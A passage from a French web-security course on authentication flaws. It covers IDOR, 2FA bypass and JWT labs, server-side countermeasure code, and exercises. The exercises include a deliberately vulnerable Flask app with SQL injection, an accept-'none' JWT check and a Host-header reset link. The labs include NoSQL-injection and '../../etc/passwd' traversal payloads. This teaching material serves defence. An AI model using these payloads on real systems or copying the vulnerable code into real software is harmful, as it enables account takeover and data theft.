   → Envoyer → lire les messages d'un autre utilisateur ?

4. Tester aussi :
   {"message_id": [501, 502, 503]}          (masse IDOR)
   {"message_id": {"$gt": 0}}               (NoSQL injection)
   {"message_id": "../../etc/passwd"}        (path traversal via IDOR)
   {"message_id": 1, "user_id": 456}        (IDOR via champ supplémentaire)

5. Observer les différences de réponse :
   - Longueur de réponse
   - Contenu (nom d'utilisateur, email)
   - Code de statut
```

### 8.5 Lab 4 — Bypass 2FA par manipulation de réponse

```
Scénario : Application avec 2FA par TOTP

1. Se connecter avec username/password corrects
2. La page de 2FA s'affiche, demander le code
3. Entrer un code incorrect (ex: 000000)
4. Intercepter la réponse du serveur dans Proxy

5. Modifier la réponse AVANT qu'elle arrive au navigateur :
   Avant : HTTP/1.1 401 Unauthorized
   Après : HTTP/1.1 200 OK

   Avant : {"success": false, "message": "Code incorrect"}
   Après : {"success": true, "message": "Authentifié"}

6. Observer si le navigateur considère l'authentification comme réussie

Autre test : modifier la requête
   Avant : POST /verify-2fa {"code": "000000"}
   Après : POST /verify-2fa {} (supprimer le champ code)
   → Certaines implémentations valident seulement si le champ est présent
```

---

## 9. Contre-mesures et Bonnes Pratiques

### 9.1 Vérification d'Ownership Côté Serveur — Règle d'Or

**Toute requête accédant à une ressource doit vérifier que l'utilisateur authentifié est propriétaire de cette ressource.** Cette vérification se fait **côté serveur uniquement** — ne jamais faire confiance au client.

```python
# Code VULNÉRABLE — fait confiance à l'ID dans la requête
@app.route('/api/invoice/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.get(invoice_id)  # ← Pas de vérification d'ownership
    return jsonify(invoice.to_dict())

# Code SÉCURISÉ — vérifie l'ownership
@app.route('/api/invoice/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        user_id=current_user.id  # ← L'ID de l'utilisateur vient de la session serveur
    ).first_or_404()
    return jsonify(invoice.to_dict())
```

```javascript
// Node.js / Express — vérification d'ownership
app.get('/api/order/:orderId', authenticate, async (req, res) => {
    const order = await Order.findOne({
        _id: req.params.orderId,
        userId: req.user.id  // req.user vient du JWT décodé côté serveur
    });

    if (!order) {
        return res.status(404).json({error: 'Not found'});  // Pas de 403 pour éviter l'énumération
    }

    res.json(order);
});
```

### 9.2 UUID v4 pour les IDs exposés

```python
# Python : générer des UUIDs v4 (non séquentiels, non prédictibles)
import uuid

new_id = str(uuid.uuid4())
# "550e8400-e29b-41d4-a716-446655440000"

# Implémentation en base de données
# SQL : UUID comme clé primaire
CREATE TABLE invoices (
    id         UUID PRIMARY KEY DEFAULT gen_random_uuid(),  -- PostgreSQL
    user_id    UUID NOT NULL REFERENCES users(id),
    amount     DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT NOW()
);
```

```javascript
// Node.js avec crypto.randomUUID() (Node 14.17+)
const id = crypto.randomUUID();
// "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d"

// Sequelize ORM
const { DataTypes } = require('sequelize');
const Invoice = sequelize.define('Invoice', {
    id: {
        type: DataTypes.UUID,
        defaultValue: DataTypes.UUIDV4,
        primaryKey: true
    }
});
```

> [!warning] UUID ≠ sécurité garantie
> Un UUID v4 rend l'énumération pratiquement impossible, mais il ne remplace pas la vérification d'ownership côté serveur. Si l'UUID d'un objet fuit (via une autre réponse, un log, une URL partagée), l'IDOR est toujours exploitable.

### 9.3 RBAC — Role-Based Access Control

```python
# Implémentation RBAC complète
from functools import wraps
from flask import abort

# Définir les permissions par rôle
PERMISSIONS = {
    "user": ["read_own_profile", "read_own_orders", "update_own_profile"],
    "moderator": ["read_own_profile", "read_all_profiles", "flag_content"],
    "admin": ["*"]  # Toutes les permissions
}

def requires_permission(permission):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            user_role = current_user.role
            allowed = PERMISSIONS.get(user_role, [])

            if "*" not in allowed and permission not in allowed:
                abort(403, "Permission insuffisante")

            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Utilisation
@app.route('/api/admin/users')
@login_required
@requires_permission("read_all_profiles")
def list_all_users():
    return jsonify(User.query.all())

@app.route('/api/user/<int:user_id>')
@login_required
@requires_permission("read_own_profile")
def get_user(user_id):
    # Même avec la permission, vérifier l'ownership
    if current_user.role != "admin" and current_user.id != user_id:
        abort(403)
    user = User.query.get_or_404(user_id)
    return jsonify(user.to_dict())
```

### 9.4 Sécurisation des JWTs

```python
# Bonnes pratiques JWT côté serveur (Python avec PyJWT)
import jwt
import datetime
from cryptography.hazmat.primitives import serialization

# 1. Utiliser RS256 (asymétrique) plutôt que HS256 pour les APIs publiques
# 2. Secret fort pour HS256 (≥ 256 bits d'entropie)
# 3. Toujours valider l'algorithme explicitement
# 4. Expiration courte (15 min à 1h) avec refresh token
# 5. Valider tous les claims

# Génération
def create_token(user_id: int, role: str) -> str:
    payload = {
        "sub": str(user_id),
        "role": role,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=15),
        "jti": secrets.token_hex(16)  # JWT ID unique pour révocation possible
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

# Vérification
def verify_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],  # Liste explicite — refuse "none" et autres
            options={
                "verify_exp": True,      # Vérifier l'expiration
                "verify_iat": True,      # Vérifier l'heure d'émission
                "require": ["exp", "sub", "role"]  # Claims obligatoires
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token expiré")
    except jwt.InvalidAlgorithmError:
        raise AuthError("Algorithme invalide")
    except jwt.InvalidTokenError:
        raise AuthError("Token invalide")
```

### 9.5 Sécurisation du 2FA

```
Bonnes pratiques 2FA :
┌──────────────────────────────────────────────────────────────────┐
│ 1. Rate limiting : max 5 tentatives puis blocage temporaire      │
│ 2. Invalidation du code après utilisation (one-time)             │
│ 3. Fenêtre temporelle stricte : ±30 secondes pour TOTP           │
│ 4. Pas de 2FA SMS pour les comptes à fort enjeu → TOTP ou FIDO2  │
│ 5. Backup codes : générés aléatoirement, stockés hashés (bcrypt) │
│ 6. Log des tentatives échouées avec IP                           │
│ 7. Notification par email lors d'une nouvelle connexion          │
│ 8. Vérification côté serveur — jamais côté client                │
└──────────────────────────────────────────────────────────────────┘
```

```python
# Rate limiting sur endpoint 2FA
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/verify-2fa', methods=['POST'])
@limiter.limit("5 per 10 minutes")  # Max 5 tentatives / 10 min
@login_required
def verify_2fa():
    code = request.json.get('code')
    user = current_user

    # Vérification TOTP
    import pyotp
    totp = pyotp.TOTP(user.totp_secret)
    if not totp.verify(code, valid_window=1):  # ±1 fenêtre (±30s)
        # Logger la tentative échouée
        log_failed_2fa_attempt(user.id, request.remote_addr)
        return jsonify({"error": "Code invalide"}), 401

    # Marquer le code comme utilisé (anti-replay)
    mark_totp_used(user.id, code)
    session['2fa_verified'] = True
    return jsonify({"success": True})
```

### 9.6 Sécurisation du Reset de Mot de Passe

```python
# Reset token sécurisé
import secrets
import hashlib
from datetime import datetime, timedelta

def generate_reset_token(user_id: int) -> str:
    # Générer un token aléatoire de 256 bits
    raw_token = secrets.token_urlsafe(32)

    # Stocker le hash (pas le token en clair)
    token_hash = hashlib.sha256(raw_token.encode()).hexdigest()
    expiry = datetime.utcnow() + timedelta(minutes=15)

    PasswordResetToken.create(
        user_id=user_id,
        token_hash=token_hash,
        expires_at=expiry,
        used=False
    )

    return raw_token  # Envoyer seulement le token brut par email

def verify_reset_token(raw_token: str) -> Optional[User]:
    token_hash = hashlib.sha256(raw_token.encode()).hexdigest()

    reset = PasswordResetToken.query.filter_by(
        token_hash=token_hash,
        used=False
    ).first()

    if not reset or reset.expires_at < datetime.utcnow():
        return None

    # Invalider immédiatement après usage
    reset.used = True
    db.session.commit()

    return User.query.get(reset.user_id)

# Sécuriser contre Host Header Injection
def send_reset_email(user_email: str, token: str):
    # Utiliser l'URL de base depuis la configuration — jamais depuis le header Host
    base_url = current_app.config['BASE_URL']  # ex: "https://app.example.com"
    reset_link = f"{base_url}/reset-password?token={token}"
    send_email(user_email, "Reset", f"Lien : {reset_link}")
```

### 9.7 Tableau récapitulatif des contre-mesures

| Vulnérabilité | Contre-mesure principale | Contre-mesure secondaire |
|---|---|---|
| IDOR/BOLA | Vérification d'ownership serveur-side | UUIDs v4 + audit logs |
| JWT alg:none | Valider l'algorithme explicitement | Liste blanche d'algos |
| JWT secret faible | Secret ≥ 256 bits (secrets.token_hex(32)) | Rotation périodique |
| OAuth open redirect | Whitelist stricte des redirect_uri | Validation exacte (pas prefix) |
| OAuth CSRF | Paramètre state obligatoire, vérifié | PKCE (Authorization Code) |
| Session fixation | Régénérer le session ID après auth | SameSite=Strict, HttpOnly |
| Session hijacking | HTTPS everywhere, Secure cookie flag | CSP pour bloquer XSS |
| 2FA bypass | Rate limiting + invalider après usage | FIDO2 à la place du TOTP |
| SIM swapping | Passer au TOTP ou FIDO2/WebAuthn | Alertes sur changements SIM |
| Password reset | Token aléatoire 256 bits, durée ≤ 15min | URL depuis config, pas Host header |
| SQLi auth bypass | Requêtes paramétrées / ORM | WAF + principe du moindre privilège |

---

## 10. Exercises et Challenges

### 10.1 Challenge 1 — Analyse JWT (Facile)

```
Contexte : Tu interceptes ce JWT sur une application de gestion de tâches.
Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIiLCJleHAiOjE2MDAwMDAwMDB9.xxxxx

Questions :
1. Décoder le header et le payload (sans outil en ligne, juste base64)
2. Que contient le claim "exp" ? Est-il encore valide ?
3. Quel algorithme est utilisé ? Quelle attaque est applicable en premier ?
4. Forger un token avec role: "admin" en utilisant alg:none
5. Écrire le code Python pour automatiser cette attaque
```

### 10.2 Challenge 2 — Enumération IDOR (Intermédiaire)

```
Contexte : Une API REST de e-commerce. Tu es connecté en tant que user_id=501.
Endpoint : GET /api/v2/order/{order_id}
Ta commande : order_id=10042

Étapes :
1. Quelles sont les 3 premières choses à tester ?
2. Comment automatiser l'énumération sur 10000 → 10200 avec BurpSuite ?
3. Comment distinguer "commande inexistante" de "accès refusé" ?
4. Tu trouves GET /api/v2/order/10087 qui retourne les données d'un autre user.
   Quels autres endpoints tester en IDOR enchaîné ?
5. L'API renvoie des UUIDs pour les profils mais des IDs numériques pour les commandes.
   Comment trouver les UUIDs des autres utilisateurs ?
```

### 10.3 Challenge 3 — Bypass 2FA (Intermédiaire)

```
Contexte : Application bancaire avec 2FA TOTP.
Le code TOTP à 6 chiffres est valable 30 secondes.
Aucun rate limiting visible sur l'endpoint /api/2fa/verify.

Questions :
1. Combien de requêtes faut-il pour brute force en 30 secondes ?
   (Justifier mathématiquement)
2. Est-ce réaliste ? Quel outil utiliser ?
3. Alternative au brute force : comment tenter la manipulation de réponse ?
4. Code Python : script de brute force TOTP avec requests
5. Quelle mesure de sécurité unique empêcherait toutes ces attaques ?
```

### 10.4 Challenge 4 — Analyse de Code Vulnérable (Avancé)

```python
# Trouver et corriger TOUTES les vulnérabilités dans ce code

from flask import Flask, request, jsonify, session
import jwt, sqlite3, hashlib

app = Flask(__name__)
app.secret_key = "dev_secret"
JWT_SECRET = "secret"

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = sqlite3.connect('db.sqlite')
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")
    user = cursor.fetchone()

    if user:
        token = jwt.encode({"user": user[1], "id": user[0], "role": user[3]}, JWT_SECRET)
        session['user_id'] = user[0]
        return jsonify({"token": token})
    return jsonify({"error": "Invalid"}), 401

@app.route('/api/document/<int:doc_id>')
def get_document(doc_id):
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256", "none"])
    except:
        return jsonify({"error": "Invalid token"}), 401

    conn = sqlite3.connect('db.sqlite')
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM documents WHERE id={doc_id}")
    doc = cursor.fetchone()
    return jsonify({"content": doc[2]})

@app.route('/reset-password', methods=['POST'])
def reset_password():
    email = request.form['email']
    import time
    token = hashlib.md5(f"{email}{int(time.time())}".encode()).hexdigest()
    reset_link = f"http://{request.headers['Host']}/reset?token={token}"
    send_email(email, reset_link)
    return jsonify({"message": "Email envoyé"})
```

```
Questions :
1. Lister toutes les vulnérabilités (au moins 7)
2. Classer par criticité (Critique / Haute / Moyenne)
3. Réécrire le code sécurisé complet
```

### 10.5 Ressources pour s'entraîner

```
Labs gratuits :
  ├── PortSwigger Web Academy — https://portswigger.net/web-security
  │    └── Labs : JWT attacks, IDOR, OAuth, 2FA bypass (excellent)
  ├── HackTheBox — https://www.hackthebox.com
  │    └── Machines avec challenges auth
  ├── TryHackMe — https://tryhackme.com
  │    └── Room : OWASP Top 10, JWT Security
  ├── OWASP WebGoat — Application locale vulnérable par design
  │    └── docker run -it -p 8080:8080 webgoat/goat-and-wolf
  └── DVWA — Damn Vulnerable Web Application
       └── docker run --rm -it -p 80:80 vulnerables/web-dvwa

Outils :
  ├── BurpSuite Community — https://portswigger.net/burp/communitydownload
  ├── jwt_tool — https://github.com/ticarpi/jwt_tool
  ├── JWT.io — décodage/vérification en ligne (lab uniquement)
  ├── Hashcat — brute force JWT secrets
  └── ffuf — fuzzing HTTP (alternative légère à Intruder)

Lectures :
  ├── OWASP API Security Top 10 2023 — https://owasp.org/API-Security/
  ├── PortSwigger Web Security Academy (articles théoriques)
  └── HackTricks — https://book.hacktricks.xyz
```

---

> [!tip] Récapitulatif mental pour un test d'intrusion auth
> Avant tout test d'authentification, parcourir cette checklist :
> 1. **JWT présent ?** → Décoder, tester alg:none, brute force secret, expiration
> 2. **OAuth ?** → Tester redirect_uri, paramètre state, vérifier PKCE
> 3. **2FA ?** → Rate limiting présent ? Manipulation de réponse ? Code recyclable ?
> 4. **Reset password ?** → Host header, token prévisible, durée de vie
> 5. **Session cookie ?** → Flags Secure/HttpOnly/SameSite, régénération après auth
> 6. **IDs dans les URLs/corps ?** → Séquentiels ? → Intruder. UUIDs ? → chercher des fuites
> 7. **PUT/PATCH/DELETE ?** → Vérifier IDOR sur chaque opération de modification
